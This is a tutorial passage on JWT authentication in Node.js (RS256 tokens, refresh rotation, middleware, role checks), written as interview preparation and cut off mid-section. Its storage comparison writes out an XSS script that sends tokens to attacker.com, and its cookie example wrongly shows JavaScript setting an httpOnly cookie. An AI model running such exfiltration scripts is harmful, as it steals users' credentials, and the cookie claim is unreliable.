# MODULE-3: Authentication & Authorization Deep Dive

**This is where security becomes production-grade!**

Authentication/authorization are THE most asked topics in lead interviews. After this module, you'll understand JWT, token management, and security better than 90% of senior engineers.

---

## 🎯 What We're Covering

### The 4 Critical Components:
1. **JWT Token Generation & Verification** - RS256 asymmetric encryption
2. **Authentication Middleware** - Token validation and user context
3. **Token Blacklist** - Instant revocation with Redis
4. **Rate Limiting** - Token bucket algorithm

---

# 🔥 COMPONENT 1: JWT Token Generation

**File:** `shared/auth/jwt.js`

## The Problem (Session Management at Scale)

**Old Way (Session Cookies):**

```
User logs in
    ↓
Server creates session
    ↓
Session stored in database/Redis
    ↓
Cookie sent to client: sessionId=abc123
    ↓
Every request:
├─ Extract sessionId from cookie
├─ Query database/Redis to get session data
├─ Check if session valid
└─ Load user from database

Problems:
├─ Database query on EVERY request (slow!)
├─ Sessions in database (scaling issues)
├─ Sticky sessions needed with multiple servers
└─ No stateless authentication
```

**New Way (JWT Tokens):**

```
User logs in
    ↓
Server generates JWT (self-contained)
    ↓
JWT contains: userId, email, role, expiry
    ↓
Token sent to client
    ↓
Every request:
├─ Extract JWT from header
├─ Verify signature (no database!)
├─ Extract user info from token
└─ Continue

Benefits:
├─ No database query per request ✅
├─ Stateless (any server can verify) ✅
├─ Scales horizontally ✅
└─ Microservices-friendly ✅
```

---

## JWT Structure

**What is JWT?**

JWT = JSON Web Token = 3 parts separated by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiaWF0IjoxNjI3ODQ1NjAwfQ.SflKxwRJSM...
│                                      │                                    │
│          HEADER                      │           PAYLOAD                  │        SIGNATURE
│    (algorithm + type)                │       (user data + claims)         │    (cryptographic proof)
```

**Decoded:**

```javascript
// HEADER
{
  "alg": "RS256",      // Algorithm: RSA with SHA-256
  "typ": "JWT"         // Type: JSON Web Token
}

// PAYLOAD
{
  "userId": 123,
  "email": "user@example.com",
  "role": "admin",
  "type": "access",
  "iat": 1627845600,   // Issued At (timestamp)
  "exp": 1627846500    // Expires (timestamp)
}

// SIGNATURE
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
```

**Key Point:** Signature proves token hasn't been tampered with!

---

## Complete Code Walkthrough

### Part 1: Setup & Configuration

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');

// Load RSA keys
const privateKey = fs.readFileSync(
  path.join(__dirname, '../../keys/private.key'),
  'utf8'
);

const publicKey = fs.readFileSync(
  path.join(__dirname, '../../keys/public.key'),
  'utf8'
);

// Token expiry times
const ACCESS_TOKEN_EXPIRY = '15m';    // 15 minutes
const REFRESH_TOKEN_EXPIRY = '7d';    // 7 days
const SERVICE_TOKEN_EXPIRY = '1h';    // 1 hour
```

**Why RSA (Asymmetric) Keys?**

```
SYMMETRIC (HS256) - Same key signs AND verifies:
├─ Server has: secretKey
├─ Server signs: jwt.sign(payload, secretKey)
├─ Server verifies: jwt.verify(token, secretKey)
└─ Problem: If User Service needs to verify, it needs secretKey
            If secretKey leaked, attacker can CREATE tokens! 💀

ASYMMETRIC (RS256) - Different keys:
├─ Server has: privateKey (signs) + publicKey (verifies)
├─ Auth Service signs: jwt.sign(payload, privateKey)
├─ User Service verifies: jwt.verify(token, publicKey)
├─ Product Service verifies: jwt.verify(token, publicKey)
└─ Benefit: Services can VERIFY but not CREATE tokens ✅
            If publicKey leaked, no problem (it's public!)
            Only privateKey can create tokens (kept secure)
```

**Real-World Example:**

```
WITHOUT RS256 (Using HS256):
├─ Secret: "my-secret-key"
├─ All 10 services need this secret to verify tokens
├─ Developer has secret in laptop for local testing
├─ Developer's laptop stolen 💀
├─ Attacker has secret
├─ Attacker can create tokens for ANY user!
└─ Security breach!

WITH RS256:
├─ Private Key: Stored in AWS Secrets Manager, never leaves Auth Service
├─ Public Key: Distributed to all services, embedded in containers
├─ Developer's laptop stolen
├─ Attacker gets public key (useless for creating tokens!)
├─ Attacker CANNOT create valid tokens ✅
└─ System remains secure!
```

---

### Part 2: Generate Access Token

```javascript
function generateAccessToken(user) {
  // Validate input
  if (!user || !user.userId || !user.email) {
    throw new Error('Invalid user object for token generation');
  }
  
  // Token payload (claims)
  const payload = {
    userId: user.userId,
    email: user.email,
    role: user.role || 'user',
    type: 'access'
  };
  
  // Sign token
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256',
    expiresIn: ACCESS_TOKEN_EXPIRY,
    issuer: 'api-gateway',
    audience: 'api-services'
  });
  
  return token;
}
```

**Payload Breakdown:**

```javascript
{
  userId: 123,          // Primary identifier
  email: "user@test.com",  // For logging/debugging
  role: "admin",        // For authorization
  type: "access",       // Distinguish from refresh/service tokens
  
  // Auto-added by jwt.sign():
  iat: 1627845600,      // Issued At (timestamp)
  exp: 1627846500,      // Expires (15 minutes later)
  iss: "api-gateway",   // Issuer
  aud: "api-services"   // Audience (who can use this token)
}
```

**Why These Claims?**

```javascript
userId: 123
// Most important - WHO is this?
// Used in every request to identify user

email: "user@test.com"
// For logging: "User user@test.com accessed /admin"
// For debugging: Which user reported this bug?
// For audit trails: Who deleted this data?

role: "admin"
// For authorization: Can this user access /admin?
// Checked in authorize() middleware

type: "access"
// Prevent token confusion:
// ❌ Can't use refresh token for API access
// ❌ Can't use access token for refresh
// ❌ Can't use service token for user requests

iat (issued at)
// When was token created?
// Useful for: "Invalidate all tokens before this time"

exp (expiry)
// When does token expire?
// Access tokens: 15 minutes (short-lived, secure)
// Refresh tokens: 7 days (long-lived, but can't access APIs)

iss (issuer)
// Who created this token?
// Verify token came from our auth service

aud (audience)
// Who should use this token?
// Prevent using internal tokens externally
```

---

### Part 3: Generate Refresh Token

```javascript
function generateRefreshToken(user, tokenId) {
  // Validate input
  if (!user || !user.userId) {
    throw new Error('Invalid user object for refresh token');
  }
  
  if (!tokenId) {
    throw new Error('Token ID required for refresh token');
  }
  
  // Minimal payload (no sensitive data!)
  const payload = {
    userId: user.userId,
    type: 'refresh',
    jti: tokenId  // JWT ID for revocation
  };
  
  // Sign token
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256',
    expiresIn: REFRESH_TOKEN_EXPIRY,
    issuer: 'api-gateway',
    audience: 'token-refresh'
  });
  
  return token;
}
```

**Why Refresh Tokens Different?**

```javascript
// ACCESS TOKEN (used for every API request):
{
  userId: 123,
  email: "user@test.com",
  role: "admin",           // ← Authorization info
  permissions: [...],       // ← Could have many permissions
  type: "access",
  exp: 15 minutes          // ← Short-lived
}

// REFRESH TOKEN (used ONLY to get new access token):
{
  userId: 123,
  type: "refresh",
  jti: "550e8400-e29b-41d4-a716-446655440000",  // ← For revocation
  exp: 7 days              // ← Long-lived
}
// No email, role, permissions - minimalist!
```

**Why Minimal Payload?**

```
Access Token Stolen:
├─ Attacker has: userId, email, role, permissions
├─ Duration: Valid for 15 minutes
├─ Impact: Limited damage (short window)
└─ Mitigation: Short expiry

Refresh Token Stolen:
├─ Attacker has: Only userId
├─ Duration: Valid for 7 days
├─ Impact: Can get new access tokens
└─ Mitigation: 
   1. Minimal data (if decoded, reveals little)
   2. Stored as hash in database (can be revoked)
   3. Token rotation (single-use)
   4. Anomaly detection (IP/device changes)
```

**The `jti` (JWT ID) - Critical for Revocation:**

```javascript
jti: "550e8400-e29b-41d4-a716-446655440000"

// Why needed:
// 1. Uniquely identify this specific token
// 2. Store in database: user_id → token_jti
// 3. Revoke specific token: DELETE WHERE jti = '550e8400...'
// 4. Prevent reuse after logout

// Logout flow:
User clicks "Logout"
    ↓
Server receives refresh token
    ↓
Extract jti from token
    ↓
Delete from database WHERE jti = '550e8400...'
    ↓
Token can't be used to get new access tokens ✅
```

---

### Part 4: Generate Service Token (Service-to-Service Auth)

```javascript
function generateServiceToken(serviceName, permissions = []) {
  // Validate input
  if (!serviceName) {
    throw new Error('Service name required');
  }
  
  // Service payload
  const payload = {
    serviceName,
    permissions,
    type: 'service',
    scope: 'internal'
  };
  
  // Sign token
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256',
    expiresIn: SERVICE_TOKEN_EXPIRY,
    issuer: 'api-gateway',
    audience: 'internal-services'
  });
  
  return token;
}
```

**Service-to-Service Authentication:**

```
USER REQUEST (with user token):
Client → Gateway → User Service
         ↓
    Verify user JWT
    Extract user info
    Forward to service

SERVICE-TO-SERVICE REQUEST:
Gateway → Product Service (needs to fetch product details)
    ↓
Gateway can't use user's token (user didn't request this!)
    ↓
Gateway generates SERVICE token:
{
  serviceName: "api-gateway",
  permissions: ["read:products"],
  type: "service"
}
    ↓
Product Service verifies:
├─ Valid signature ✅
├─ Type = "service" ✅
├─ Has "read:products" permission ✅
└─ Allow request
```

**Why Separate Service Tokens?**

```
WITHOUT service tokens:
├─ Gateway uses user's token to call Product Service
├─ Product Service thinks user made the request directly
├─ Audit log: "User 123 accessed product data" (misleading!)
├─ If user token expires mid-request: Service calls fail!
└─ Security: User permissions apply to internal calls (wrong!)

WITH service tokens:
├─ Gateway uses service token to call Product Service
├─ Product Service knows: Gateway made this call
├─ Audit log: "api-gateway accessed product data" (accurate!)
├─ Service token has longer expiry (1 hour)
└─ Security: Service permissions, not user permissions ✅
```

---

### Part 5: Verify Token (THE MOST IMPORTANT!)

```javascript
function verifyToken(token, expectedType = null) {
  try {
    // Verify signature and decode
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer: 'api-gateway'
    });
    
    // Check token type if specified
    if (expectedType && decoded.type !== expectedType) {
      throw new Error(`Invalid token type. Expected: ${expectedType}, got: ${decoded.type}`);
    }
    
    // Check expiry (jwt.verify already checks, but be explicit)
    if (decoded.exp && Date.now() >= decoded.exp * 1000) {
      throw new Error('Token expired');
    }
    
    return decoded;
    
  } catch (error) {
    // Transform JWT errors into user-friendly messages
    if (error.name === 'TokenExpiredError') {
      throw new Error('Token expired');
    }
    
    if (error.name === 'JsonWebTokenError') {
      throw new Error('Invalid token');
    }
    
    if (error.name === 'NotBeforeError') {
      throw new Error('Token not yet valid');
    }
    
    // Unknown error
    throw error;
  }
}
```

**What jwt.verify() Does:**

```
1. Split token into: header.payload.signature

2. Extract algorithm from header:
   ├─ Header says: "RS256"
   ├─ Options allow: ["RS256"]
   └─ Match? ✅

3. Verify signature:
   ├─ Recompute: RSASHA256(header + payload, publicKey)
   ├─ Compare with provided signature
   └─ Match? ✅ (token hasn't been tampered!)

4. Check issuer:
   ├─ Token says: "api-gateway"
   ├─ Options expect: "api-gateway"
   └─ Match? ✅

5. Check expiry:
   ├─ Token exp: 1627846500 (timestamp)
   ├─ Current time: 1627845600
   └─ Expired? No ✅

6. Return decoded payload:
   {
     userId: 123,
     email: "user@test.com",
     role: "admin",
     type: "access",
     iat: 1627845600,
     exp: 1627846500,
     iss: "api-gateway"
   }
```

**Security Checks:**

```javascript
// 1. Algorithm check (prevent algorithm confusion attack)
algorithms: ['RS256']

// Attack without this:
// Attacker changes header.alg to "none"
// Removes signature
// Server verifies with "none" algorithm
// Accepts tampered token! 💀

// 2. Issuer check (prevent cross-service token reuse)
issuer: 'api-gateway'

// Attack without this:
// Attacker steals token from different service
// Uses it on our service
// Accepted! 💀

// 3. Type check (prevent token confusion)
if (decoded.type !== 'access') {
  throw new Error('Wrong token type');
}

// Attack without this:
// Attacker uses refresh token (long-lived) for API access
// Refresh token valid for 7 days instead of 15 minutes! 💀
```

---

## RS256 vs HS256 Deep Dive

### HS256 (Symmetric - Single Secret)

```javascript
// SIGNING (Auth Service)
const token = jwt.sign(payload, "my-secret-key", {
  algorithm: 'HS256'
});

// VERIFYING (User Service)
const decoded = jwt.verify(token, "my-secret-key", {
  algorithms: ['HS256']
});

// Problem: User Service needs the SAME secret!
// If User Service compromised, attacker can CREATE tokens!
```

**HS256 Attack Scenario:**

```
1. User Service needs to verify tokens
2. Deployment: ENV var SECRET_KEY="super-secret"
3. Developer logs into User Service for debugging
4. Runs: echo $SECRET_KEY → "super-secret"
5. Developer's laptop stolen 💀
6. Attacker has the secret!
7. Attacker creates token:
   {
     userId: 1,  // Admin user!
     role: "superadmin",
     exp: 9999999999  // Year 2286
   }
8. Attacker signs with stolen secret
9. All services accept the fake token ✅
10. Complete compromise! 💀
```

---

### RS256 (Asymmetric - Key Pair)

```javascript
// Key generation (done ONCE, offline):
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key

// SIGNING (Auth Service only)
const token = jwt.sign(payload, privateKey, {
  algorithm: 'RS256'
});

// VERIFYING (All services)
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']
});

// Benefit: Services can VERIFY but not CREATE tokens!
```

**RS256 Security:**

```
1. Private Key:
   ├─ Location: AWS Secrets Manager (never leaves there!)
   ├─ Access: Only Auth Service, via IAM role
   ├─ Usage: Signs tokens
   └─ If stolen: Attacker can create tokens (but hard to steal!)

2. Public Key:
   ├─ Location: Embedded in all service containers
   ├─ Access: Everyone (it's PUBLIC!)
   ├─ Usage: Verifies tokens
   └─ If stolen: No problem! Can't create tokens!

Even if attacker compromises User Service:
├─ Gets public key
├─ Can verify existing tokens
├─ CANNOT create new tokens ✅
└─ Limited damage!
```

---

## Token Expiry Strategy

### Why 15 Minutes for Access Tokens?

```
TOO SHORT (1 minute):
├─ User makes request
├─ Token expires mid-request
├─ Next request: Token expired!
├─ User experience: Constant re-auth
└─ Bad UX ❌

TOO LONG (24 hours):
├─ Token stolen
├─ Attacker has 24 hours to cause damage
├─ User logs out
├─ Token still valid for 24 hours!
└─ Security risk ❌

GOLDILOCKS (15 minutes):
├─ Long enough: Most user sessions < 15 min per action
├─ Short enough: Limited damage if stolen
├─ User logout: Token expires quickly (max 15 min)
└─ OWASP recommendation ✅
```

**Real Numbers:**

```
Average user behavior:
├─ Logs in
├─ Views products (2 min)
├─ Adds to cart (1 min)
├─ Checks out (3 min)
├─ Total: 6 minutes < 15 minute token
└─ No interruption! ✅

Token stolen at minute 0:
├─ Attacker has access: 15 minutes
├─ User logs out at minute 5
├─ Attacker still has access: 10 minutes remaining
├─ Damage window: 10 minutes (vs 24 hours!)
└─ Much better! ✅
```

---

### Token Refresh Flow

```
Time 0:00 - User logs in
├─ Access token: Valid until 0:15
└─ Refresh token: Valid until day 7

Time 0:14 - Access token about to expire
├─ Client: "My token expires in 1 minute!"
├─ Client sends refresh token to /api/auth/refresh
├─ Server: Verify refresh token ✅
├─ Server: Generate NEW access token (valid until 0:29)
├─ Server: Generate NEW refresh token (valid until day 14)
├─ Server: Delete OLD refresh token from database
└─ Client: Store new tokens

Time 0:15 - Old access token expires
├─ Doesn't matter! Client has new token
└─ Seamless for user! ✅

Time 0:28 - New token about to expire
└─ Repeat refresh process
```

**Token Rotation (Security Feature):**

```
WITHOUT rotation:
├─ Refresh token: "abc123" (valid 7 days)
├─ Day 1: Use to get new access token
├─ Day 2: Use same token to get new access token
├─ Day 3: Token stolen! 💀
├─ Day 3-7: Attacker AND user both using same token
├─ Server can't tell who's legitimate!
└─ Security issue ❌

WITH rotation:
├─ Refresh token: "abc123" (valid 7 days)
├─ Day 1: Use to get new access token
│  └─ Server: Gives "xyz789", DELETES "abc123"
├─ Day 2: Use "xyz789" to get new access token
│  └─ Server: Gives "def456", DELETES "xyz789"
├─ Day 3: Token "def456" stolen! 💀
├─ Day 3: Attacker uses "def456"
│  └─ Server: Gives "ghi789", DELETES "def456"
├─ Day 3: User tries to use "def456" (still has old token)
│  └─ Server: Token not in database! REJECT!
│  └─ Server: Suspicious! Token reuse! REVOKE ALL user tokens!
│  └─ Alert security team!
└─ Attack detected! ✅
```

---

## Interview Questions

### Q1: "Explain JWT and why it's used instead of sessions."

**Perfect Answer:**

"JWT (JSON Web Token) is a self-contained token that carries user information and claims. Unlike traditional sessions stored in a database, JWTs are stateless - the server can verify them without database lookups.

Structure: header.payload.signature, where signature cryptographically proves the token hasn't been tampered with.

**Advantages over sessions:**

1. **Stateless**: No database query per request. Session cookies require looking up session in database/Redis, adding 10-50ms latency.

2. **Scalable**: Any server can verify tokens. Sessions require sticky sessions or shared session store.

3. **Microservices-friendly**: Token can be verified by any service with the public key. Sessions would require each service to query central session store.

4. **Includes claims**: Token contains user info (role, permissions) needed for authorization. Sessions only have session ID, requiring database lookup for user data.

**Trade-offs:** JWTs are harder to revoke (require blacklist), slightly larger than session cookies (200-400 bytes vs 32 bytes), and can't be updated without re-issuing.

In production, I use short-lived access tokens (15 min) with long-lived refresh tokens (7 days) to balance security and UX."

---

### Q2: "Why RS256 instead of HS256?"

**Perfect Answer:**

"RS256 uses asymmetric keys (public/private pair) while HS256 uses a symmetric secret.

**With HS256:**
- Same secret signs and verifies tokens
- Every service needs the secret to verify
- If any service compromised, attacker can CREATE tokens
- Security breach: one stolen secret = complete compromise

**With RS256:**
- Private key signs (only Auth Service has it)
- Public key verifies (all services have it, it's public!)
- If service compromised, attacker can only verify existing tokens
- Cannot create new tokens without private key
- Much better security boundary

**Real scenario:** Developer debugging User Service exports environment variables including JWT secret. Laptop stolen. With HS256, attacker can create tokens for any user. With RS256, attacker only gets public key (useless for creating tokens).

I use RS256 for microservices, keep private key in AWS Secrets Manager accessible only to Auth Service via IAM role, and distribute public key in container images. Cost is slightly slower verification (~5ms vs ~0.5ms), but security is worth it."

---

### Q3: "How do you handle token revocation with JWT?"

**Perfect Answer:**

"JWTs are stateless, which makes revocation challenging since servers don't track active tokens. I use a multi-layered approach:

**1. Short-lived access tokens (15 min):**
- If token stolen, attacker has limited window
- User logout: token expires soon anyway
- No revocation needed for most cases

**2. Redis blacklist for critical revocations:**
- Store jti (JWT ID) in Redis when explicitly revoking
- Check blacklist during token verification
- Set TTL = token remaining lifetime
- Use for: logout, password change, security breaches

**3. Refresh token database tracking:**
- Store refresh tokens (hashed) in database
- Delete on logout = can't get new access tokens
- Rotate on use (single-use tokens)
- Detect reuse = revoke all user tokens

**4. Version claims:**
- Include tokenVersion in JWT
- Store version in database
- On security event: increment user's version
- Verify token.version === user.version

**Example flow:**
```
User reports: 'My account was hacked!'
→ Increment user's tokenVersion in DB (1 → 2)
→ Attacker's tokens have version: 1 (rejected!)
→ Legitimate user re-logs in, gets version: 2 ✅
```

Trade-off: Blacklist adds database lookup (defeats stateless purpose), but only needed for critical operations. 99% of requests have no blacklist check."

---

### Q4: "What's the difference between access and refresh tokens?"

**Perfect Answer:**

"They serve different purposes with different security profiles:

**Access Token:**
- Purpose: Authenticate API requests
- Lifetime: Short (15 minutes)
- Payload: Rich (userId, email, role, permissions)
- Usage: Sent with every API call
- Storage: Memory (never localStorage - XSS risk)
- Revocation: Usually not needed (expires quickly)

**Refresh Token:**
- Purpose: Get new access tokens
- Lifetime: Long (7 days)
- Payload: Minimal (just userId and jti)
- Usage: Sent only to /refresh endpoint
- Storage: httpOnly cookie or secure storage
- Revocation: Tracked in database, can be revoked

**Why both?**

If I used one long-lived token for APIs:
- Stolen token valid for days (security risk)
- Rich payload exposed for days (privacy risk)
- Hard to revoke without blacklisting

With separate tokens:
- Access token stolen: Only valid 15 minutes
- Refresh token stolen: Useless for API calls, must use /refresh endpoint which we can monitor for anomalies
- Can revoke refresh token anytime (it's in database)
- Minimal data in long-lived token

**Token rotation:** Each time refresh token is used, I issue a new one and delete the old one. This prevents reuse and detects token theft (if both user and attacker use same token, second use fails, triggering security alert)."

---

### Q5: "How do you prevent JWT attacks?"

**Perfect Answer:**

"JWTs have several attack vectors I protect against:

**1. Algorithm Confusion Attack:**
```javascript
// Attack: Change header.alg from RS256 to 'none' or HS256
// Prevention: Explicitly whitelist algorithms
jwt.verify(token, key, { algorithms: ['RS256'] })
// Never use algorithm from token itself
```

**2. Token Substitution:**
```javascript
// Attack: Use token from different service/environment
// Prevention: Verify issuer and audience
jwt.verify(token, key, { 
  issuer: 'api-gateway',
  audience: 'api-services'
})
```

**3. Token Type Confusion:**
```javascript
// Attack: Use refresh token (7 days) for API access (should be 15 min)
// Prevention: Check token type
if (decoded.type !== 'access') throw new Error('Invalid token type')
```

**4. Signature Stripping:**
```javascript
// Attack: Remove signature, use as 'none' algorithm
// Prevention: Reject tokens without signature, enforce RS256
```

**5. Weak Secrets (HS256):**
```javascript
// Attack: Brute force weak secret
// Prevention: Use RS256 instead, or 256-bit random secret
```

**6. Token Reuse After Logout:**
```javascript
// Prevention: Blacklist jti on logout, check before accepting
// Or: Increment token version, reject old versions
```

**7. XSS Token Theft:**
```javascript
// Attack: Steal token from localStorage via XSS
// Prevention: 
// - Never store in localStorage
// - Use httpOnly cookies, OR
// - Store in memory only (lost on page reload, re-auth via refresh)
```

All JWT operations wrapped in try/catch with explicit error handling. Log failed verifications for security monitoring. Rate limit token endpoints to prevent brute force."

---

## Production Metrics

**Performance Impact:**

```
SESSION-BASED AUTH (database lookup per request):
├─ Request arrives
├─ Extract session ID: 0.1ms
├─ Query Redis for session: 5ms
├─ Deserialize session data: 0.5ms
├─ Query database for user: 15ms
├─ Total: ~20ms per request
└─ At 1000 req/s: 20,000ms/s of auth overhead

JWT AUTH (verify signature):
├─ Request arrives
├─ Extract token: 0.1ms
├─ Verify RS256 signature: 3ms
├─ Parse payload: 0.1ms
├─ Total: ~3ms per request
└─ At 1000 req/s: 3,000ms/s of auth overhead

Improvement: 85% reduction in auth latency! 🚀
```

**Token Sizes:**

```
SESSION COOKIE:
└─ sessionId=abc123... (32 bytes)

JWT ACCESS TOKEN:
├─ Header: ~40 bytes
├─ Payload: ~250 bytes (userId, email, role, permissions, claims)
├─ Signature: ~340 bytes (RS256)
└─ Total: ~630 bytes (20x larger)

Trade-off: Larger but self-contained
```

**Refresh Token Rotation Stats (7-day period):**

```
User: Active daily user
├─ Logins: 14 times (twice per day)
├─ Refresh operations: 280 (every 15 min while active)
├─ Tokens issued: 280 access + 280 refresh = 560 tokens
├─ Old tokens in database: 0 (all rotated out)
└─ Security: Each token single-use ✅

Without rotation:
└─ Old tokens in database: 1 (same refresh token all 7 days)

If token stolen on day 3:
├─ With rotation: Detected on first reuse ✅
└─ Without rotation: Undetected for 4 days ❌
```

---

---

# 🔥 COMPONENT 2: Authentication Middleware

**File:** `shared/auth/middleware.js`

## The Problem (Manual Auth Checking)

**Without Middleware (Tutorial Code):**

```javascript
app.get('/api/profile', async (req, res) => {
  // Manually extract token
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'Invalid token format' });
  }
  
  // Manually verify
  try {
    const decoded = jwt.verify(token, publicKey);
    req.user = decoded;
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  // Check blacklist
  const blacklisted = await redisClient.get(`blacklist:${decoded.jti}`);
  if (blacklisted) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  // Finally... your actual logic
  const user = await getUserById(req.user.userId);
  res.json(user);
});

// Problems:
// ❌ Duplicate auth code in EVERY route
// ❌ Easy to forget checks (security hole!)
// ❌ Inconsistent error handling
// ❌ Hard to maintain
```

**With Middleware (Production Code):**

```javascript
// Define once
const authenticate = require('./middleware/authenticate');

// Use everywhere
app.get('/api/profile', authenticate, async (req, res) => {
  // req.user already populated! ✅
  const user = await getUserById(req.user.userId);
  res.json(user);
});

// Benefits:
// ✅ Auth logic in ONE place
// ✅ Can't forget to check (middleware enforces)
// ✅ Consistent errors
// ✅ Easy to maintain
```

---

## Complete Code Walkthrough

### Part 1: authenticate() Middleware

```javascript
const { verifyToken } = require('./jwt');
const blacklist = require('./blacklist');

async function authenticate(req, res, next) {
  try {
    // Step 1: Extract token from header
    const token = extractToken(req);
    
    if (!token) {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Authentication required',
          code: 'NO_TOKEN'
        }
      });
    }
    
    // Step 2: Verify token signature and expiry
    const decoded = verifyToken(token, 'access');
    
    // Step 3: Check if token is blacklisted
    const isBlacklisted = await blacklist.isBlacklisted(decoded.jti);
    
    if (isBlacklisted) {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Token has been revoked',
          code: 'TOKEN_REVOKED'
        }
      });
    }
    
    // Step 4: Attach user to request
    req.user = {
      userId: decoded.userId,
      email: decoded.email,
      role: decoded.role,
      tokenId: decoded.jti
    };
    
    // Step 5: Continue to next middleware/route handler
    next();
    
  } catch (error) {
    // Handle verification errors
    if (error.message === 'Token expired') {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Token expired',
          code: 'TOKEN_EXPIRED'
        }
      });
    }
    
    if (error.message === 'Invalid token') {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Invalid token',
          code: 'INVALID_TOKEN'
        }
      });
    }
    
    // Unknown error - pass to error handler
    next(error);
  }
}
```

**Step-by-Step Flow:**

```
Request arrives: GET /api/profile
    ↓
authenticate() middleware executes
    ↓
STEP 1: Extract token from Authorization header
├─ Header: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
├─ Split on space: ["Bearer", "eyJhbGciOi..."]
└─ Get token: "eyJhbGciOi..."

STEP 2: Verify token
├─ Check signature (RS256) ✅
├─ Check expiry ✅
├─ Check type = "access" ✅
└─ Decode payload:
    {
      userId: 123,
      email: "user@test.com",
      role: "admin",
      jti: "550e8400-..."
    }

STEP 3: Check blacklist
├─ Query Redis: GET blacklist:550e8400-...
├─ Result: null (not blacklisted)
└─ OK to proceed ✅

STEP 4: Attach user to request
req.user = {
  userId: 123,
  email: "user@test.com",
  role: "admin",
  tokenId: "550e8400-..."
}

STEP 5: Call next()
    ↓
Route handler executes
    ↓
// req.user is available!
const user = await getUserById(req.user.userId);
```

---

### Part 2: extractToken() Helper

```javascript
function extractToken(req) {
  // Method 1: Authorization header (preferred)
  const authHeader = req.headers.authorization;
  
  if (authHeader && authHeader.startsWith('Bearer ')) {
    return authHeader.substring(7); // Remove "Bearer " prefix
  }
  
  // Method 2: Query parameter (for WebSocket/SSE, not recommended for REST)
  if (req.query && req.query.token) {
    return req.query.token;
  }
  
  // Method 3: Cookie (if using httpOnly cookies)
  if (req.cookies && req.cookies.accessToken) {
    return req.cookies.accessToken;
  }
  
  // No token found
  return null;
}
```

**Why Multiple Methods?**

```javascript
// METHOD 1: Authorization header (BEST for REST APIs)
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

Benefits:
├─ Standard HTTP header
├─ Works with all clients (web, mobile, CLI)
├─ Easy to add/remove
├─ Not sent to different domains
└─ Recommended ✅

// METHOD 2: Query parameter (for special cases)
GET /api/stream?token=eyJhbGciOi...

Use case:
├─ WebSocket connections (can't set headers)
├─ Server-Sent Events (EventSource can't set headers)
├─ Image URLs that need auth
└─ Warning: Token in URL = logged by proxies/servers

// METHOD 3: httpOnly Cookie (good for browser-only)
Cookie: accessToken=eyJhbGciOi...

Benefits:
├─ Automatic sending by browser
├─ httpOnly = JavaScript can't access (XSS protection)
├─ Secure flag = HTTPS only
└─ Good for browser-only apps

Drawbacks:
├─ CSRF risk (need CSRF token)
├─ Doesn't work with mobile apps
└─ Complex with CORS
```

**Security Comparison:**

```
LOCAL STORAGE (BAD! ❌):
localStorage.setItem('token', 'eyJhbGciOi...')

// XSS attack:
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
</script>
// Attacker has token! 💀

MEMORY ONLY (BETTER ✅):
let token = 'eyJhbGciOi...'  // JavaScript variable

// XSS attack:
<script>
  fetch('https://attacker.com/steal?token=' + token)
</script>
// Attacker has token BUT only for this page load
// User refreshes page → token gone
// More secure, but loses token on refresh

HTTPONLY COOKIE (BEST FOR BROWSERS ✅):
document.cookie = 'token=eyJhbGciOi...; httpOnly; secure'

// XSS attack:
<script>
  console.log(document.cookie)  // "token" not visible!
</script>
// JavaScript CANNOT access httpOnly cookies
// Only browser sends it automatically
// Very secure! ✅

AUTHORIZATION HEADER (BEST FOR APIs ✅):
fetch('/api/profile', {
  headers: { 'Authorization': 'Bearer ' + token }
})

// XSS attack:
// Still can steal if token in memory
// BUT: Token not automatically sent (CSRF protection)
// Mobile apps, CLI tools can use this
// Industry standard ✅
```

---

### Part 3: authorize() Middleware (Role-Based Access Control)

```javascript
function authorize(...allowedRoles) {
  return (req, res, next) => {
    // Must run AFTER authenticate()
    if (!req.user) {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Authentication required',
          code: 'NOT_AUTHENTICATED'
        }
      });
    }
    
    // Check if user's role is allowed
    const userRole = req.user.role;
    
    if (!allowedRoles.includes(userRole)) {
      return res.status(403).json({
        success: false,
        error: {
          message: 'Insufficient permissions',
          code: 'FORBIDDEN',
          required: allowedRoles,
          actual: userRole
        }
      });
    }
    
    // User has required role
    next();
  };
}
```

**Usage Examples:**

```javascript
// Example 1: Admin only
app.delete('/api/users/:id', 
  authenticate,                    // Check token
  authorize('admin'),              // Check role = admin
  async (req, res) => {
    await deleteUser(req.params.id);
    res.json({ success: true });
  }
);

// Example 2: Admin or moderator
app.post('/api/posts/:id/ban',
  authenticate,
  authorize('admin', 'moderator'),  // Either role OK
  async (req, res) => {
    await banPost(req.params.id);
    res.json({ success: true });
  }
);

// Example 3: Any authenticated user (no authorize needed)
app.get('/api/profile',
  authenticate,                     // Just check token
  async (req, res) => {
    res.json(req.user);
  }
);
```

**401 vs 403 - Critical Difference!**

```
401 UNAUTHORIZED:
├─ Meaning: "Who are you? I don't know you!"
├─ Reason: No token, invalid token, expired token
├─ Action: User should login/refresh token
├─ Example: No Authorization header
└─ Response: "Authentication required"

403 FORBIDDEN:
├─ Meaning: "I know who you are, but you can't do this!"
├─ Reason: Valid token, but insufficient permissions
├─ Action: User needs different role/permissions
├─ Example: Regular user trying to access admin endpoint
└─ Response: "Insufficient permissions"

// WRONG:
